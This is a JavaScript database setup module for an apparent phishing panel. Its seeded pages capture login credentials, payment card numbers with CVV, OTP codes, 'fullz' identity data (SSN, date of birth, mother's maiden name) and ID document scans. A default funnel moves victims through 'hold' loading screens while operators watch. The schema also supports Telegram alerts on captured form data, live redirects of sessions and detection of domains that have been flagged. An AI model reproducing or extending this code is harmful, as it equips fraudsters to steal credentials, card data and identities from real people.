const Database = require('better-sqlite3');
const path = require('path');
const config = require('../config/default');
const bcrypt = require('bcryptjs');
const { v4: uuidv4 } = require('uuid');

let db;

function getDb() {
  if (!db) {
    const dbPath = config.db.path;
    const dir = path.dirname(dbPath);
    const fs = require('fs');
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    db = new Database(dbPath);
    db.pragma('journal_mode = WAL');
    db.pragma('foreign_keys = ON');
    // Keep WAL small: checkpoint after every 100 pages (~400 KB) instead of
    // the SQLite default of 1000 pages (4 MB). A large un-checkpointed WAL
    // makes reads appear stale or wiped because readers scan both the main DB
    // file AND the WAL — if the WAL grows huge, reads become slow and
    // inconsistent until it is eventually merged.
    db.pragma('wal_autocheckpoint = 100');
    // Optimise for speed (safe on a single-process server)
    db.pragma('synchronous = NORMAL');
    db.pragma('cache_size = -8000');  // 8 MB page cache
  }
  return db;
}

function initialize() {
  const db = getDb();

  // Create tables
  db.exec(`
    CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT UNIQUE NOT NULL,
      email TEXT UNIQUE NOT NULL,
      password_hash TEXT NOT NULL,
      role TEXT DEFAULT 'viewer',
      avatar_color TEXT DEFAULT '#6366f1',
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      last_login DATETIME,
      session_token TEXT DEFAULT NULL
    );

    CREATE TABLE IF NOT EXISTS websites (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      name TEXT NOT NULL,
      domain TEXT NOT NULL,
      api_key TEXT UNIQUE NOT NULL,
      demo_slug TEXT,
      logo_url TEXT DEFAULT NULL,
      color TEXT DEFAULT '#6366f1',
      is_active INTEGER DEFAULT 1,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS sessions (
      id TEXT PRIMARY KEY,
      website_id INTEGER REFERENCES websites(id),
      visitor_id TEXT,
      ip_address TEXT,
      user_agent TEXT,
      browser TEXT,
      os TEXT,
      device TEXT,
      country TEXT,
      city TEXT,
      current_page TEXT,
      referrer TEXT,
      pages_viewed INTEGER DEFAULT 1,
      started_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      last_activity DATETIME DEFAULT CURRENT_TIMESTAMP,
      is_active INTEGER DEFAULT 1,
      metadata TEXT DEFAULT '{}'
    );

    CREATE TABLE IF NOT EXISTS page_views (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      session_id TEXT REFERENCES sessions(id),
      website_id INTEGER REFERENCES websites(id),
      page_url TEXT,
      page_title TEXT,
      duration_ms INTEGER DEFAULT 0,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS redirect_rules (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      website_id INTEGER REFERENCES websites(id),
      name TEXT,
      source_pattern TEXT DEFAULT '*',
      target_url TEXT NOT NULL,
      is_active INTEGER DEFAULT 1,
      apply_when_offline INTEGER DEFAULT 0,
      priority INTEGER DEFAULT 0,
      conditions TEXT DEFAULT '{}',
      redirect_count INTEGER DEFAULT 0,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS redirect_commands (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      session_id TEXT,
      website_id INTEGER,
      target_url TEXT,
      executed_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      executed_by INTEGER REFERENCES users(id)
    );

    CREATE TABLE IF NOT EXISTS notifications (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      type TEXT DEFAULT 'info',
      title TEXT,
      message TEXT,
      link TEXT,
      is_read INTEGER DEFAULT 0,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS audit_logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id INTEGER REFERENCES users(id),
      username TEXT,
      action TEXT,
      category TEXT DEFAULT 'general',
      details TEXT DEFAULT '{}',
      ip_address TEXT,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS settings (
      key TEXT PRIMARY KEY,
      value TEXT,
      updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS telegram_config (
      id INTEGER PRIMARY KEY DEFAULT 1,
      bot_token TEXT DEFAULT '',
      chat_id TEXT DEFAULT '',
      is_active INTEGER DEFAULT 0,
      notify_new_session INTEGER DEFAULT 1,
      notify_form_data INTEGER DEFAULT 1,
      notify_errors INTEGER DEFAULT 1,
      notify_page_views INTEGER DEFAULT 0
    );

    CREATE TABLE IF NOT EXISTS blocked_ips (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      ip_address TEXT UNIQUE NOT NULL,
      type TEXT DEFAULT 'manual',
      reason TEXT DEFAULT '',
      expires_at DATETIME DEFAULT NULL,
      blocked_requests INTEGER DEFAULT 0,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS activity_feed (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      type TEXT,
      icon TEXT,
      message TEXT,
      details TEXT DEFAULT '{}',
      website_id INTEGER,
      session_id TEXT,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    );

    CREATE INDEX IF NOT EXISTS idx_sessions_website ON sessions(website_id);
    CREATE INDEX IF NOT EXISTS idx_sessions_active ON sessions(is_active);
    CREATE INDEX IF NOT EXISTS idx_sessions_visitor ON sessions(visitor_id);
    CREATE INDEX IF NOT EXISTS idx_sessions_ip ON sessions(ip_address);
    CREATE INDEX IF NOT EXISTS idx_sessions_dedup ON sessions(website_id, visitor_id, ip_address, is_active);
    CREATE INDEX IF NOT EXISTS idx_page_views_session ON page_views(session_id);
    CREATE INDEX IF NOT EXISTS idx_page_views_website ON page_views(website_id);
    CREATE INDEX IF NOT EXISTS idx_page_views_timestamp ON page_views(timestamp);
    CREATE INDEX IF NOT EXISTS idx_audit_logs_timestamp ON audit_logs(timestamp);
    CREATE INDEX IF NOT EXISTS idx_activity_feed_timestamp ON activity_feed(timestamp);
    CREATE INDEX IF NOT EXISTS idx_notifications_read ON notifications(is_read);
    CREATE UNIQUE INDEX IF NOT EXISTS idx_websites_demo_slug ON websites(demo_slug);

    CREATE TABLE IF NOT EXISTS demo_pages (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      website_id INTEGER REFERENCES websites(id) ON DELETE CASCADE,
      url TEXT UNIQUE NOT NULL,
      name TEXT NOT NULL,
      form_type TEXT DEFAULT 'general',
      fields_schema TEXT DEFAULT '[]',
      field_mappings TEXT DEFAULT '{}'
    );

    CREATE TABLE IF NOT EXISTS funnels (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      website_id INTEGER REFERENCES websites(id) ON DELETE CASCADE,
      name TEXT NOT NULL,
      steps TEXT NOT NULL,
      is_active INTEGER DEFAULT 1,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );
  `);

  // Migrations for existing databases

  // Single-session enforcement: token rotated on every login
  try {
    db.exec(`ALTER TABLE users ADD COLUMN session_token TEXT DEFAULT NULL;`);
  } catch (e) { /* Column might already exist */ }

  try {
    db.exec(`ALTER TABLE websites ADD COLUMN demo_slug TEXT;`);
  } catch (e) {
    // Column might already exist
  }
  try {
    db.exec(`CREATE UNIQUE INDEX IF NOT EXISTS idx_websites_demo_slug ON websites(demo_slug);`);
  } catch (e) {
    // Index might already exist
  }
  try {
    db.exec(`ALTER TABLE demo_pages ADD COLUMN website_id INTEGER REFERENCES websites(id) ON DELETE CASCADE;`);
  } catch (e) {
    // Column might already exist
  }
  try {
    db.exec(`ALTER TABLE demo_pages ADD COLUMN field_mappings TEXT DEFAULT '{}';`);
  } catch (e) {
    // Column might already exist
  }
  try {
    db.exec(`ALTER TABLE websites ADD COLUMN logo_url TEXT DEFAULT NULL;`);
  } catch (e) {
    // Column might already exist
  }
  try {
    db.exec(`ALTER TABLE websites ADD COLUMN color TEXT DEFAULT '#6366f1';`);
  } catch (e) {
    // Column might already exist
  }

  // ─── Domain routing support ──────────────────────────────────────────────────
  try {
    db.exec(`ALTER TABLE websites ADD COLUMN domain_active INTEGER DEFAULT 1;`);
  } catch (e) { /* Column exists */ }
  try {
    db.exec(`ALTER TABLE websites ADD COLUMN domain_alt TEXT DEFAULT NULL;`);
  } catch (e) { /* Column exists */ }
  try {
    db.exec(`ALTER TABLE websites ADD COLUMN domain_alt_active INTEGER DEFAULT 0;`);
  } catch (e) { /* Column exists */ }
  // Migrate domain_alt from plain string to JSON array
  try {
    const rows = db.prepare("SELECT id, domain_alt, domain_alt_active FROM websites WHERE domain_alt IS NOT NULL").all();
    for (const row of rows) {
      try { JSON.parse(row.domain_alt); } catch(e) {
        const arr = JSON.stringify([{ domain: row.domain_alt, active: row.domain_alt_active || 0 }]);
        db.prepare("UPDATE websites SET domain_alt = ? WHERE id = ?").run(arr, row.id);
      }
    }
  } catch(e) {}

  // ─── Per-website Telegram bot columns (Phase 3) ──────────────────────────────
  try {
    db.exec(`ALTER TABLE websites ADD COLUMN tg_bot_token TEXT DEFAULT NULL;`);
  } catch (e) { /* Column exists */ }
  try {
    db.exec(`ALTER TABLE websites ADD COLUMN tg_chat_id TEXT DEFAULT NULL;`);
  } catch (e) { /* Column exists */ }
  try {
    db.exec(`ALTER TABLE websites ADD COLUMN tg_allowed_users TEXT DEFAULT '[]';`);
  } catch (e) { /* Column exists */ }
  try {
    db.exec(`ALTER TABLE websites ADD COLUMN tg_bot_active INTEGER DEFAULT 0;`);
  } catch (e) { /* Column exists */ }

  // Add analytics columns to demo_pages (Phase 2)
  try {
    db.exec(`ALTER TABLE demo_pages ADD COLUMN views_count INTEGER DEFAULT 0;`);
  } catch (e) { /* Column exists */ }
  
  try {
    db.exec(`ALTER TABLE demo_pages ADD COLUMN submissions_count INTEGER DEFAULT 0;`);
  } catch (e) { /* Column exists */ }
  
  try {
    db.exec(`ALTER TABLE demo_pages ADD COLUMN last_activity_at DATETIME;`);
  } catch (e) { /* Column exists */ }
  
  try {
    db.exec(`ALTER TABLE demo_pages ADD COLUMN created_at DATETIME DEFAULT CURRENT_TIMESTAMP;`);
  } catch (e) { /* Column exists */ }
  
  try {
    db.exec(`ALTER TABLE demo_pages ADD COLUMN updated_at DATETIME DEFAULT CURRENT_TIMESTAMP;`);
  } catch (e) { /* Column exists */ }

  // Update existing websites/demo pages with default values if necessary
  try {
    db.prepare("UPDATE websites SET demo_slug = 'demo' WHERE name = 'Demo Website' AND (demo_slug IS NULL OR demo_slug = '')").run();
  } catch (e) {}
  try {
    const demoSite = db.prepare("SELECT id FROM websites WHERE name = 'Demo Website' LIMIT 1").get();
    if (demoSite) {
      db.prepare("UPDATE demo_pages SET website_id = ? WHERE website_id IS NULL").run(demoSite.id);
    }
  } catch (e) {}

  // ─── Domain Management tables ────────────────────────────────────────────────
  db.exec(`
    CREATE TABLE IF NOT EXISTS domains (
      id                       INTEGER PRIMARY KEY AUTOINCREMENT,
      domain                   TEXT UNIQUE NOT NULL,
      dns_provider             TEXT DEFAULT 'cloudflare',
      hosting_provider         TEXT DEFAULT 'vps',
      cf_zone_id               TEXT DEFAULT NULL,
      nameservers              TEXT DEFAULT NULL,
      status                   TEXT DEFAULT 'pending_nameservers',
      dns_records              TEXT DEFAULT NULL,
      ssl_status               TEXT DEFAULT NULL,
      last_checked_at          DATETIME DEFAULT NULL,
      last_uptime_check_at     DATETIME DEFAULT NULL,
      uptime_ok                INTEGER DEFAULT NULL,
      error_message            TEXT DEFAULT NULL,
      error_count              INTEGER DEFAULT 0,
      is_processing            INTEGER DEFAULT 0,
      manual_override          INTEGER DEFAULT 0,
      manual_override_note     TEXT DEFAULT NULL,
      website_id               INTEGER DEFAULT NULL,
      created_at               DATETIME DEFAULT CURRENT_TIMESTAMP,
      updated_at               DATETIME DEFAULT CURRENT_TIMESTAMP
    );

    CREATE TABLE IF NOT EXISTS domain_audit_logs (
      id          INTEGER PRIMARY KEY AUTOINCREMENT,
      domain_id   INTEGER REFERENCES domains(id) ON DELETE CASCADE,
      domain_name TEXT NOT NULL,
      action      TEXT NOT NULL,
      details     TEXT DEFAULT '{}',
      error       TEXT DEFAULT NULL,
      created_at  DATETIME DEFAULT CURRENT_TIMESTAMP
    );

    CREATE INDEX IF NOT EXISTS idx_domains_status     ON domains(status);
    CREATE INDEX IF NOT EXISTS idx_domains_domain     ON domains(domain);
    CREATE INDEX IF NOT EXISTS idx_domain_audit_dom   ON domain_audit_logs(domain_id);
  `);

  // Release any stale processing locks on startup (e.g. after a crash)
  try {
    db.exec(`UPDATE domains SET is_processing = 0 WHERE is_processing = 1`);
  } catch { /* table may not yet exist on first boot — init above handles it */ }

  // Domain monitoring columns (flag detection)
  try { db.exec(`ALTER TABLE domains ADD COLUMN flagged INTEGER DEFAULT 0;`); } catch {}
  try { db.exec(`ALTER TABLE domains ADD COLUMN flag_reason TEXT DEFAULT NULL;`); } catch {}
  try { db.exec(`ALTER TABLE domains ADD COLUMN flag_detected_at DATETIME DEFAULT NULL;`); } catch {}

  // Per-user page permissions (managed by god role)
  try {
    db.exec(`ALTER TABLE users ADD COLUMN permissions TEXT DEFAULT '{}';`);
  } catch (e) { /* Column exists */ }

  // ─── Admin drawer features (migration 012 mirror for SQLite) ────────────────
  try { db.exec(`ALTER TABLE users ADD COLUMN password_must_change INTEGER DEFAULT 0;`); } catch {}
  try { db.exec(`ALTER TABLE users ADD COLUMN ip_allowlist TEXT DEFAULT '[]';`);           } catch {}
  try { db.exec(`ALTER TABLE users ADD COLUMN deleted_at DATETIME DEFAULT NULL;`);         } catch {}
  try { db.exec(`ALTER TABLE users ADD COLUMN tfa_secret TEXT DEFAULT NULL;`);             } catch {}
  try { db.exec(`ALTER TABLE users ADD COLUMN tfa_enabled INTEGER DEFAULT 0;`);            } catch {}
  try { db.exec(`ALTER TABLE users ADD COLUMN tfa_backup_codes TEXT DEFAULT '[]';`);       } catch {}
  db.exec(`
    CREATE TABLE IF NOT EXISTS user_notes (
      id         INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id    INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
      author_id  INTEGER REFERENCES users(id) ON DELETE SET NULL,
      note       TEXT NOT NULL,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    );
    CREATE INDEX IF NOT EXISTS idx_user_notes_user ON user_notes(user_id);
  `);
  db.exec(`
    CREATE TABLE IF NOT EXISTS password_reset_tokens (
      id         INTEGER PRIMARY KEY AUTOINCREMENT,
      user_id    INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
      token      TEXT UNIQUE NOT NULL,
      expires_at DATETIME NOT NULL,
      used_at    DATETIME DEFAULT NULL,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      created_by INTEGER REFERENCES users(id) ON DELETE SET NULL
    );
    CREATE INDEX IF NOT EXISTS idx_reset_tokens_token ON password_reset_tokens(token);
    CREATE INDEX IF NOT EXISTS idx_reset_tokens_user  ON password_reset_tokens(user_id);
  `);

  // ─── User ⇄ Website Assignments ─────────────────────────────────────────────
  // Legacy table from the pre-owner_id scoping model. Kept so old rows survive
  // upgrades; the app no longer reads it. Ownership is on websites.owner_id /
  // domains.owner_id instead.
  db.exec(`
    CREATE TABLE IF NOT EXISTS user_websites (
      user_id    INTEGER NOT NULL REFERENCES users(id)    ON DELETE CASCADE,
      website_id INTEGER NOT NULL REFERENCES websites(id) ON DELETE CASCADE,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      PRIMARY KEY (user_id, website_id)
    );
    CREATE INDEX IF NOT EXISTS idx_user_websites_user    ON user_websites(user_id);
    CREATE INDEX IF NOT EXISTS idx_user_websites_website ON user_websites(website_id);
  `);

  // ─── Per-user ownership columns (matches Supabase migration 006) ────────────
  try { db.exec(`ALTER TABLE websites ADD COLUMN owner_id INTEGER REFERENCES users(id) ON DELETE RESTRICT;`); } catch {}
  try { db.exec(`ALTER TABLE domains  ADD COLUMN owner_id INTEGER REFERENCES users(id) ON DELETE RESTRICT;`); } catch {}
  try {
    const god = db.prepare("SELECT id FROM users WHERE role = 'god' ORDER BY id LIMIT 1").get();
    if (god) {
      db.prepare('UPDATE websites SET owner_id = ? WHERE owner_id IS NULL').run(god.id);
      db.prepare('UPDATE domains  SET owner_id = ? WHERE owner_id IS NULL').run(god.id);
    }
  } catch {}
  try { db.exec(`CREATE INDEX IF NOT EXISTS idx_websites_owner ON websites(owner_id);`); } catch {}
  try { db.exec(`CREATE INDEX IF NOT EXISTS idx_domains_owner  ON domains(owner_id);`); } catch {}

  // ─── owner_id on remaining shared tables (matches Supabase migration 007) ───
  try { db.exec(`ALTER TABLE notifications ADD COLUMN owner_id INTEGER REFERENCES users(id) ON DELETE RESTRICT;`); } catch {}
  try { db.exec(`ALTER TABLE activity_feed ADD COLUMN owner_id INTEGER REFERENCES users(id) ON DELETE RESTRICT;`); } catch {}
  try { db.exec(`ALTER TABLE blocked_ips  ADD COLUMN owner_id INTEGER REFERENCES users(id) ON DELETE RESTRICT;`); } catch {}
  try {
    const god = db.prepare("SELECT id FROM users WHERE role = 'god' ORDER BY id LIMIT 1").get();
    if (god) {
      db.prepare('UPDATE notifications SET owner_id = ? WHERE owner_id IS NULL').run(god.id);
      // Activity: prefer the emitting website's owner; fall back to god.
      try {
        db.prepare(`UPDATE activity_feed SET owner_id = (
          SELECT w.owner_id FROM websites w WHERE w.id = activity_feed.website_id
        ) WHERE owner_id IS NULL AND website_id IS NOT NULL`).run();
      } catch {}
      db.prepare('UPDATE activity_feed SET owner_id = ? WHERE owner_id IS NULL').run(god.id);
      db.prepare('UPDATE blocked_ips  SET owner_id = ? WHERE owner_id IS NULL').run(god.id);
    }
  } catch {}
  try { db.exec(`CREATE INDEX IF NOT EXISTS idx_notifications_owner ON notifications(owner_id);`); } catch {}
  try { db.exec(`CREATE INDEX IF NOT EXISTS idx_activity_feed_owner ON activity_feed(owner_id);`); } catch {}
  try { db.exec(`CREATE INDEX IF NOT EXISTS idx_blocked_ips_owner   ON blocked_ips(owner_id);`); } catch {}
  try { db.exec(`CREATE INDEX IF NOT EXISTS idx_audit_logs_user     ON audit_logs(user_id);`); } catch {}

  // ─── Notifications: taxonomy + grouping + undo (migration 013) ────────────
  // category  — routing bucket (security | tenant | system | activity)
  // severity  — low | normal | high | critical (controls toast/sound/badge)
  // actor_id  — user who caused the event (nullable — system events)
  // event     — machine-readable event slug (was only in socket payload)
  // group_key — used to collapse similar events within a 5-min window
  // count     — how many events collapsed into this row (≥1)
  // expires_at — undo window deadline (used by delete events)
  // undo_action — JSON: { kind, params } that /notifications/:id/undo can act on
  try { db.exec(`ALTER TABLE notifications ADD COLUMN category TEXT DEFAULT 'system';`); } catch {}
  try { db.exec(`ALTER TABLE notifications ADD COLUMN severity TEXT DEFAULT 'normal';`); } catch {}
  try { db.exec(`ALTER TABLE notifications ADD COLUMN actor_id INTEGER REFERENCES users(id) ON DELETE SET NULL;`); } catch {}
  try { db.exec(`ALTER TABLE notifications ADD COLUMN event TEXT;`); } catch {}
  try { db.exec(`ALTER TABLE notifications ADD COLUMN group_key TEXT;`); } catch {}
  try { db.exec(`ALTER TABLE notifications ADD COLUMN count INTEGER DEFAULT 1;`); } catch {}
  try { db.exec(`ALTER TABLE notifications ADD COLUMN expires_at DATETIME;`); } catch {}
  try { db.exec(`ALTER TABLE notifications ADD COLUMN undo_action TEXT;`); } catch {}
  try { db.exec(`ALTER TABLE notifications ADD COLUMN undone_at DATETIME;`); } catch {}
  try { db.exec(`CREATE INDEX IF NOT EXISTS idx_notifications_group ON notifications(owner_id, group_key, is_read);`); } catch {}
  try { db.exec(`CREATE INDEX IF NOT EXISTS idx_notifications_severity ON notifications(severity, is_read);`); } catch {}

  // ─── Users: notification prefs + watched user + telegram chat id ──────────
  try { db.exec(`ALTER TABLE users ADD COLUMN notification_prefs TEXT;`); } catch {}
  try { db.exec(`ALTER TABLE users ADD COLUMN watched_user_ids TEXT DEFAULT '[]';`); } catch {}
  try { db.exec(`ALTER TABLE users ADD COLUMN telegram_chat_id TEXT;`); } catch {}

  // Seed default admin if no users exist
  const userCount = db.prepare('SELECT COUNT(*) as count FROM users').get();
  if (userCount.count === 0) {
    const hash = bcrypt.hashSync(config.defaultAdmin.password, 10);
    db.prepare(`
      INSERT INTO users (username, email, password_hash, role, avatar_color)
      VALUES (?, ?, ?, ?, ?)
    `).run(
      config.defaultAdmin.username,
      config.defaultAdmin.email,
      hash,
      config.defaultAdmin.role,
      '#6366f1'
    );
    console.log('✅ Default admin created: admin / admin123');
  }

  // Seed default settings
  const settingsCount = db.prepare('SELECT COUNT(*) as count FROM settings').get();
  if (settingsCount.count === 0) {
    const defaults = {
      'site_name': 'Admin Live Panel',
      'maintenance_mode': '0',
      'maintenance_message': 'We are currently performing scheduled maintenance. Please check back soon.',
      'session_timeout': '30',
      'max_sessions_display': '100',
      'enable_geo_tracking': '1',
      'enable_activity_feed': '1',
      'data_retention_days': '90',
      'admin_online': '1',
      'notify_new_session': '1',
      'notify_form_data': '1',
      'notify_sound': '1',
      'notify_duration': '8',
      'hold_sound': 'pulse',
      'hold_volume': '80'
    };
    const insert = db.prepare('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)');
    for (const [key, value] of Object.entries(defaults)) {
      insert.run(key, value);
    }
  }

  // Seed telegram config
  const tgCount = db.prepare('SELECT COUNT(*) as count FROM telegram_config').get();
  if (tgCount.count === 0) {
    db.prepare('INSERT INTO telegram_config (id) VALUES (1)').run();
  }

  // Seed a demo website
  const webCount = db.prepare('SELECT COUNT(*) as count FROM websites').get();
  if (webCount.count === 0) {
    const apiKey = 'demo-' + uuidv4().slice(0, 8);
    db.prepare(`
      INSERT INTO websites (name, domain, api_key, demo_slug) VALUES (?, ?, ?, ?)
    `).run('Demo Website', 'localhost', apiKey, 'demo');
    console.log(`✅ Demo website created with API key: ${apiKey}`);
  }

  // Seed demo pages
  const pageCount = db.prepare('SELECT COUNT(*) as count FROM demo_pages').get();
  if (pageCount.count === 0) {
    const website = db.prepare('SELECT id FROM websites WHERE name = ? LIMIT 1').get('Demo Website');
    const websiteId = website ? website.id : null;
    const pages = [
      { url: '/demo', name: 'Landing Page', form_type: 'general', fields_schema: '[]' },
      { url: '/demo/login', name: 'Login Credentials', form_type: 'login', fields_schema: '["email","password"]' },
      { url: '/demo/cc', name: 'Payment Card Info', form_type: 'credit_card', fields_schema: '["card_number","card_holder","expiry","cvv","billing_name","billing_zip","billing_country","billing_address"]' },
      { url: '/demo/otp', name: 'SMS/OTP Verification', form_type: 'otp', fields_schema: '["otp_code","phone"]' },
      { url: '/demo/fullz', name: 'Profile Details (Fullz)', form_type: 'general', fields_schema: '["ssn","dob","mother_maiden"]' },
      { url: '/demo/kyc', name: 'Identity Document Check', form_type: 'kyc', fields_schema: '["document_front","document_back"]' },
      { url: '/demo/loading', name: 'Hold Spinner Screen', form_type: 'general', fields_schema: '[]' }
    ];
    const insertPage = db.prepare('INSERT INTO demo_pages (website_id, url, name, form_type, fields_schema) VALUES (?, ?, ?, ?, ?)');
    for (const p of pages) {
      insertPage.run(websiteId, p.url, p.name, p.form_type, p.fields_schema);
    }
    console.log('✅ Default demo pages seeded');
  }

  // Seed a default funnel for the website
  const funnelCount = db.prepare('SELECT COUNT(*) as count FROM funnels').get();
  if (funnelCount.count === 0) {
    const website = db.prepare('SELECT id FROM websites WHERE name = ? LIMIT 1').get('Demo Website');
    if (website) {
      const steps = [
        { url: '/demo/login', behavior: 'auto' },
        { url: '/demo/loading', behavior: 'hold' },
        { url: '/demo/cc', behavior: 'auto' },
        { url: '/demo/otp', behavior: 'hold' },
        { url: '/demo/loading', behavior: 'hold' }
      ];
      db.prepare('INSERT INTO funnels (website_id, name, steps, is_active) VALUES (?, ?, ?, 1)')
        .run(website.id, 'Default Demo Funnel', JSON.stringify(steps));
      console.log('✅ Default demo funnel seeded');
    }
  }

  console.log('✅ Database initialized successfully');
  return db;
}

function getAdapter() {
  const { getAdapter: fetchAdapter } = require('./adapter');
  return fetchAdapter();
}

module.exports = { getDb, initialize, getAdapter };

